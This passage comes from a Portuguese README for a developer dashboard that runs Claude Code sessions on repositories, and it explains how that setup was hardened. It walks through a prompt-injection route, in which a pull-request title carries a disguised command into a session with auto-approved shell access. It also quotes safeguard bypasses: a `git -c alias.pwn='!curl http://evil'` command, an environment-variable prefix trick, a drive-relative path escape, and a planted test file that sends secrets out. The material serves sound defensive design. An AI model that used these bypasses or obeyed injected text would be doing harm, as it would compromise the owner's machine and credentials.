existiu. Achado na prova de aceitação de 25/08/2026, com uma execução real de
R$ 10,37, e travado por teste (`HaOQuePublicar`).

### O texto de estranho que quase virou comando

Achado da revisão de segurança de 25/08/2026, corrigido antes de a entrega ser
mesclada. Vale registrar inteiro, porque o desenho parecia seguro e não era.

O prompt da sessão filha é um gabarito fechado com quatro campos. Um deles, o
`detalhe` da pendência `pr_parado`, era o **título do pedido de alteração**,
copiado cru da API do GitHub (`coletar_github.py`). Título de PR é escolhido por
quem abre o PR — colaborador, fork de repositório público, automação de terceiro.

O ataque completo, em quatro passos: a pessoa abre um PR com um título que é uma
ordem disfarçada; espera sete dias, até a regra `pr_parado` acender no painel; o
dono clica em `Resolver` naquela pendência; o texto dela entra no prompt de uma
sessão que roda com `Bash`, `Write` e `Edit` **auto-aprovados**, com o login e os
hooks do dono. Ou seja: comando arbitrário nesta máquina, com o `gh` já
autenticado ao lado.

Duas barreiras foram postas, e a primeira sozinha já fecha o buraco:

1. **Campo de origem externa não entra no prompt.** O `detalhe` de `pr_parado`
   passou a ser `pedido #N, parado ha D dias` — número e dias, calculados aqui.
   O título continua a um clique de distância, no botão `Abrir`.
2. **Defesa em profundidade, para a próxima regra que alguém escrever.** Os
   campos `texto` e `detalhe` agora vão dentro de um bloco
   `<dados-coletados-nao-confiaveis>`, com aviso explícito de que são dados e não
   instruções, e passam por `so_dado()`, que neutraliza a etiqueta de fechamento
   caso o próprio dado tente escrevê-la para sair do bloco.

**A lição, que vale além deste recurso:** "o servidor recalcula do banco" não é
sinônimo de "o dado é confiável". Recalcular só descarta o que o *navegador*
mandou. O que veio da internet e foi guardado continua vindo da internet.

### O que este recurso NÃO isola

`Bash` está na lista branca e **não** fica preso à cópia: o shell não conhece
fronteira de pasta. `Bash` fica porque sem ele a sessão não roda teste nem
commita — e aí o recurso não existe.

Enquanto havia uma pessoa olhando a tela, isso era um risco vigiado. A fila
(`fila.py`) roda **desacompanhada**, e um risco sem vigia é outro risco. Quatro
barreiras foram postas em 25/08/2026, em ordem de importância:

1. **A cópia não alcança o GitHub.** Ela era um `git worktree`, que compartilha
   o `.git` do projeto de verdade e, com ele, o `origin` já autenticado: um
   `git push --force` saído de lá chegava ao repositório real. Passou a ser um
   `git clone --no-hardlinks` com o `origin` removido e `core.hooksPath` numa
   pasta vazia. Custa disco e meio segundo (medido: 0,5 s neste repositório; o
   maior dos 17 tem 342 MB de `.git`) e paga com uma propriedade que nenhuma
   lista de comandos daria — dali não há caminho até o GitHub. Quem atravessa
   essa ponte é o painel, depois, com o diff já aprovado pelas travas.
2. **A sessão filha não carrega configuração de arquivo nenhum.**
   `--setting-sources ""` corta tudo o que vem de arquivo, e o `--settings`
   explicito sobrevive ao corte (medido em 25/08/2026, `claude` 2.1.245 — a
   versão anterior deste README dizia que só `--bare` isolaria, e estava
   errado). Some o `~/.claude` do dono, que rodava seis hooks `SessionStart`
   dentro da filha; e some o `.claude/settings.json` **do repositório sendo
   consertado**, que é conteúdo escrito por estranho e podia definir hook
   próprio. Este segundo era o furo que ninguém tinha visto.
3. **Todo comando passa por uma lista antes de rodar** (`barreira.py`, um hook
   `PreToolUse`). Medido numa sessão de verdade em 25/08/2026, por US$ 0,33:
   `git push origin main` e `curl http://example.com` **barrados** com a frase
   em português; `git status --porcelain` rodou. Lista branca de programas, nada que vire
   interpretador de texto solto (`python -c`, `node -e`, `bash -c`), nenhum
   caminho absoluto ou com `..`, e `.git/` intocável. Recusa sai com código 2
   e a frase em português chega à sessão.

   **O `git` tem lista BRANCA de subcomando, e a razão é um furo medido.** A
   revisão de segurança de 25/08/2026 encontrou, e a medição confirmou, que
   `git -c alias.pwn='!curl http://evil' pwn` passava **liberado** pela lista
   negra: o git executa o valor do alias por um shell que a barreira nunca
   leria, e de dentro dele `git remote add` mais `git push` alcançavam o
   GitHub com a credencial do dono. A mesma porta existia em `core.pager`,
   `core.fsmonitor`, `diff.external` e `--exec-path`. Lista negra de `git`
   sempre perde: cada versão inventa capacidade nova, e a lista só protege o
   que já conhece.

   Da mesma revisão, três furos da mesma família: prefixo `NOME=valor` antes
   do comando (`GIT_EXTERNAL_DIFF=x git diff` rodava `x`), caminho relativo
   ao drive do Windows (`C:segredo.txt` escapava do teste de caminho
   absoluto, que exigia a barra) e — o pior — **bug na barreira abria a
   porta**: só o código 2 barra, e exceção não tratada saía com código 1, que
   o Claude Code trata como liberado. `decidir` é um interpretador de linha
   de comando escrito à mão; ele *vai* ter bug. Agora qualquer exceção
   vira código 2.

4. **A sessão não recebe segredo do ambiente** (`execucao.ambiente_da_filha`).
   O `Popen` da filha não passava `env=`, então ela herdava o ambiente inteiro
   do painel. Como a sessão é instruída a rodar a suíte do projeto-alvo, um
   `conftest.py` plantado lê `os.environ` e manda tudo embora por socket — e a
   barreira barra `curl` pelo **nome**, não contém rede. `GH_TOKEN` e
   `GITHUB_TOKEN` são os que mais importam: com eles a sessão alcança o GitHub
   sem precisar de `git push` nenhum. `ANTHROPIC_API_KEY` vai junto de
   propósito, porque sem ela a sessão não roda — está escrito no código e tem
   teste, para ninguém descobrir por acidente.

**E o que continua não sendo isolado, dito sem enfeite:** rodar teste É rodar
código arbitrário — a suíte do projeto é código de terceiro executando com todos
os poderes do usuário desta máquina. A barreira encarece e estreita o caminho;
ela não transforma a máquina num cofre. Não há isolamento de rede: o Claude Code
desta versão não tem modo `sandbox` no Windows, e uma cerca de firewall por
processo exigiria administrador. O que impede o estrago de **sair da cópia** são
as barreiras 1 e 2; a 3 é o que impede o caminho fácil.

**Consequência prática, e ela incomoda:** `npm install`, `pip install` e afins
estão barrados. Um item de `dependencia_insegura` num projeto JavaScript que
precise baixar dependência vai **falhar com motivo claro** em vez de baixar
pacote sem ninguém olhando. É a troca escolhida; afrouxar depois é mais fácil
que o contrário.

## A memória do tempo — o painel passa a lembrar de ontem

Até 25/08/2026 o HUB respondia bem "o que precisa de mim agora?" e não respondia
nada sobre ontem. A tabela `historico` do banco tinha **uma linha**. Faltavam
três coisas que decidem se uma lista é usada ou ignorada:

1. **Idade.** Uma pendência nascida há uma hora e outra aberta há 23 dias
   apareciam iguais — mesmo tamanho, mesma cor, mesma linha.
2. **Progresso.** Lista que só cresce e nunca reconhece o que foi feito é lista
   que se aprende a fechar.
3. **Direção.** "Isto está piorando" é informação. "Existem 27 pendências" não é.

### Como funciona

Tabela `pendencia_vida` (`id`, `regra`, `projeto`, `gravidade`, `visto_em`,
`ultimo_em`, `fechada_em`). A cada coleta **local** bem-sucedida, o servidor
avalia as regras e atualiza a vida de cada pendência: quem apareceu ganha
`visto_em`, quem continua tem o `ultimo_em` renovado (**não** rejuvenesce), quem
sumiu ganha `fechada_em`. No mesmo instante um retrato numérico vai para o
`historico`.

Fica em tabela separada da `pendencia_estado` de propósito: aquela guarda
**decisão do dono** (silenciar por 24 h), esta guarda **observação do coletor**.
Misturar as duas faria uma faxina no banco apagar a escolha dele junto com a
medição.

**Por que o registro roda no laço de coleta e não no `/api/dados`.** Aquela rota
é disparada pelo navegador de 15 em 15 segundos. Gravar ali faria a aba dirigir o
banco — e, pior, com o painel fechado o dia inteiro o histórico ficaria vazio
justamente no dia em que ele não olhou. Painel que só lembra do que aconteceu
enquanto estava sendo olhado não tem memória: tem espelho.

Um erro no registro **nunca** derruba a coleta. O número na tela vale mais que o
registro histórico dele.

### A armadilha da estreia, e como ela foi fechada

Na primeira coleta depois desta mudança, **todas** as pendências abertas ganham
`visto_em = agora` — inclusive um grafo de código velho há 23 dias. Sem trava, a
tela estrearia com 27 selos de "nova" mentindo em uníssono, e o dono aprenderia
na primeira olhada que o selo mente.

Duas travas, uma em cada ponta:

- **`desde_o_inicio`**: quem já estava ali quando a memória começou tem a idade
  exata *desconhecida*. O campo `dias` vem `None`, nunca zero — zero é um número,
  e número errado num painel custa mais caro que número ausente.
- **`novas_24h` só conta quem nasceu depois do início da memória.** Sem isso, o
  briefing anunciaria "27 apareceram nas últimas 24 h" no primeiro minuto de
  vida. Nenhuma era nova: elas já estavam lá, só não havia quem lembrasse.

Mas não saber a idade exata não é não saber nada. A memória sabe há quanto tempo
**ela** existe, e a pendência que já estava aqui na estreia tem no mínimo essa
idade — daí o campo `dias_min` e o texto "aberta há mais de 9 dias". Enquanto a
memória tiver menos de um dia, a linha fica calada.

### O briefing matinal

Uma frase no topo, escrita por função pura a partir dos números. Duas regras a
separam de enfeite:

- **Com pendência alta aberta, ela nunca diz que está tudo certo.**
- **Nunca é genérica**: sempre cita número e nome de projeto.

Frase que não muda quando o dado muda é decoração, e decoração no topo de um
painel operacional é pior que espaço vazio — ensina a não ler o topo. Três
estados de dado produzem três textos diferentes, e isso é coberto por teste.

Ao lado dela, o placar: urgentes, novas hoje, fechadas nos últimos 7 dias, e um
sparkline em SVG puro da semana. **O placar de "fechadas" só aparece quando há o
que comemorar** — um "0 fechadas" permanente no topo da tela é uma repreensão
diária, não uma informação.

## O fim do ruído: dez linhas iguais viram uma

Em 25/08/2026, **10 das 27 pendências abertas eram a mesma regra** — grafo de
código velho — em dez projetos, cada uma com a mesma ação manual. São 37% da
caixa de entrada dizendo a mesma coisa: exatamente o mecanismo que o filtro da
regra 2 existe para evitar. Caixa que nasce com muitos alarmes iguais ensina o
dono a ignorar a caixa inteira, inclusive o alarme que importava.

`regras.agrupar()` dobra qualquer regra com **3 ou mais** ocorrências numa linha
só, com a contagem, a idade da mais velha e os projetos dentro. Com os dados
daquele dia, 27 pendências viraram **10 linhas**.

**Com uma exceção, em `NAO_AGRUPAR`: alerta de segurança nunca se dobra.** Dez
"grafo velho" são dez linhas dizendo a mesma coisa, com a mesma ação. Quatro
projetos com alerta de segurança não são: em 25/08/2026 iam de 6 críticos em 19
alertas a 93 alertas com 11 baixos. *"4 projetos com alertas de segurança
abertos"* é verdade e não ajuda — apaga justamente o número que diz por onde
começar. Medido no painel: o agrupamento entrega **14 linhas** em vez de 11, e
vale a troca.

**É uma visão, não um substituto.** O `/api/dados` continua mandando a lista
achatada em `pendencias`, e o agrupamento vai à parte, em `grupos`. O motivo é
concreto: o botão "Resolver" recalcula a pendência pelo `id` no servidor — e é
isso que mantém o prompt fechado a texto de estranho — e o "×" de esconder por
24 h também é por `id`. Trocar o formato de `pendencias` quebraria os dois. Aqui
muda o desenho; a identidade não muda.

O grupo é um `<details>` de verdade, não um painel escrito à mão: o **Ctrl+F do
navegador acha o que está lá dentro** sem o dono precisar abrir.

## O site está no ar? E o que está lá é o que você escreveu?

O HUB media git, Docker, CI, alertas, cota e grafo — e não media a única coisa
que **o cliente percebe antes do dono**. Cinco projetos declaram `url_prod` no
`casos.json`, um deles marcado `criticidade: critica`. Site fora do ar não
produzia pendência nenhuma nesta tela.

### Regra 15 — o site não respondeu (alta)

`GET` na raiz, sem credencial e sem cookie, na cadência de 20 minutos da camada
`github`. **5xx ou ausência de resposta = fora do ar**; 3xx e 4xx contam como
servidor **vivo**, porque um 301 já é prova de que ele respondeu.

**Redirecionamento não é seguido.** Seguir o pulo levaria a requisição para um
domínio que este painel não escolheu.

> **O que esta regra NÃO garante.** Responder 200 na raiz não é o mesmo que
> estar funcionando. Banco caído atrás de uma home estática continua devolvendo
> 200. Isto pega o apagão, não a doença.

### Regra 16 — trabalho pronto e não publicado (média)

Commits na branch padrão do GitHub mais novos que o último deploy bem-sucedido.
Repositório sem workflow de publicação identificável fica **calado** — não saber
não é o mesmo que estar atrasado (invariante 2).

### O cuidado com produção

Esta é a única parte do HUB que toca em produção, e por isso ela tem interruptor:
`MEDIR_SITE` no topo de `coletar_github.py`. Desligar apaga a regra 15 e não muda
mais nada.

`url_segura()` barra `localhost`, rede interna, `.local` e qualquer esquema que
não seja web, **sem tocar em DNS** — a resolução de nome fica em `host_publico()`.
Estão separadas para o teste rodar offline: teste que consulta DNS é teste que
quebra a CI numa terça-feira qualquer.

Hoje o `casos.json` é escrito só pelo dono e nada disso é necessário. Entra assim
mesmo, pelo mesmo motivo que o `detalhe` do pedido de alteração virou número em
25/08: no dia em que essa lista vier de outro lugar, um endereço apontando para
`127.0.0.1` transformaria este coletor numa ferramenta de varredura de dentro da
máquina dele.

**Falha de medição não apaga medição boa.** `ok=None` é "não medi"; `ok=False` é
"caiu". Um blip de rede às 20h não pode fazer "site no ar" virar "site fora" —
mesmo cuidado que os alertas de segurança já tinham.

## 203 alertas eram 32 pacotes: contagem não é risco

Até 25/08/2026 a linha de segurança dizia uma coisa só: *"93 alerta(s) de
segurança aberto(s) em medconsultoria."* Verdade, e mesmo assim enganava. Os 203
alertas dos quatro projetos foram baixados um a um com `gh api` naquele dia, e o
que apareceu foi isto:

| Projeto | Alertas | Críticos | Altos | Pacotes | Defeitos distintos |
|---|---|---|---|---|---|
| medconsultoria | 93 | 2 | 44 | 24 | 85 |
| odontologia-pericia | 71 | 1 | 40 | 13 | 62 |
| investrix | 20 | 0 | 12 | 9 | 17 |
| workspace-medconsultoria | 19 | **6** | 7 | 7 | 12 |

O projeto com **mais** alertas não é o mais perigoso, e o mais perigoso era o que
a tela mostrava como menor. Três leituras erradas saíam de um número certo:

1. **Contagem não é tamanho do trabalho.** 203 alertas, 32 pacotes distintos no
   total. Boa parte é dependência transitiva que sai num `npm update`.
2. **Contagem não é gravidade.** Os 11 alertas *baixos* do `medconsultoria`
   pesavam na tela igual aos 6 *críticos* do `workspace-medconsultoria`.
3. **O mesmo defeito era contado várias vezes.** Os 6 críticos do
   `workspace-medconsultoria` são **dois CVEs de `vitest`** (CVE-2025-24964 e
   CVE-2026-47429) repetidos por três manifestos. Três tarefas onde havia uma.

Hoje a mesma consulta GraphQL — **sem uma ida a mais na rede** — traz
`severity`, `package`, `ghsaId` e `dependencyScope` de até 100 alertas, e
`_resume_alertas()` devolve severidade, pacotes distintos, defeitos distintos e
escopo. A frase virou *"6 crítico(s) e 7 alto(s) entre 19 alerta(s) de segurança
em workspace-medconsultoria, em 7 pacote(s)"*, e o detalhe embaixo abre o resto.

### A tentação que foi medida e recusada

O GitHub diz, por alerta, se a dependência é `RUNTIME` ou `DEVELOPMENT`. A
tentação óbvia é rebaixar tudo que é `DEVELOPMENT` — *"vitest é ferramenta de
teste, não vai para produção"*. **Não dá, e isso foi medido, não suposto:** no
próprio `workspace-medconsultoria` o **mesmo `vitest`** volta `DEVELOPMENT` num
manifesto e **`RUNTIME` noutro**, porque num `package.json` ele está declarado
fora de `devDependencies`.

Rebaixar por escopo esconderia um crítico real de produção. O escopo entra na
tela como **fato**, na linha de detalhe, e `gravidade_alerta()` não olha para ele.

### Não saber não é o mesmo que estar seguro

A gravidade caiu para **média** quando não há nenhum crítico nem alto. Duas
situações sobem de volta para **alta**, de propósito:

- **Sem severidade medida** — coleta antiga no banco, ou permissão que concedeu
  o `totalCount` e recusou o detalhe.
- **Amostra** — o GraphQL lê 100 alertas por consulta. Repositório com mais que
  isso devolve amostra, o crítico pode estar justamente entre os que não vieram,
  e a frase passa a dizer *"pelo menos"* em vez de afirmar a distribuição.

Rebaixar por falta de medição seria mais uma forma de o painel mentir com número
certo — a mesma família dos quatro casos da seção de segurança.

### A ordem da lista também mentia

Consertar a frase resolveu metade. Com a severidade já no texto, as quatro linhas
ainda saíam `investrix` (12 altos, zero crítico) **antes** de
`workspace-medconsultoria` (6 críticos) — porque `i` vem antes de `w` no alfabeto.

`risco_alerta()` dá **100 por crítico e 1 por alto**, e esse peso desempata dentro
da gravidade. Um crítico ganha de qualquer número plausível de altos: são coisas
diferentes, não a mesma moeda. Moderado e baixo valem **zero** — são 47 dos 203
alertas reais e, se contassem, seriam eles a decidir o desempate.

O peso nunca atravessa gravidades: uma pendência média com risco alto continua
atrás de qualquer alta. Regra que não mede risco fica em zero e ordena pelo nome,
como sempre.

## O que ainda não existe

Fases 3 e 4 da especificação (a **fase 2 está entregue**, seção acima) (`~/.claude/docs/superpowers/plans/2026-08-24-hub-do-dev.md`):

- **Fase 3 — entregue.** O briefing matinal e a divergência entre local e
  servidor estão nas seções acima, junto com a memória do tempo e o fim do
  ruído, que não estavam na especificação original e nasceram de medir a lista
  de verdade. Já eram: a **nota de saúde por projeto** e a **paleta de comandos
  (`Ctrl+K`)**.
- **Fase 4** — o `radar.py` do `~/.claude` passa a ler este banco em vez de
  coletar por conta própria, acabando com os dois coletores.
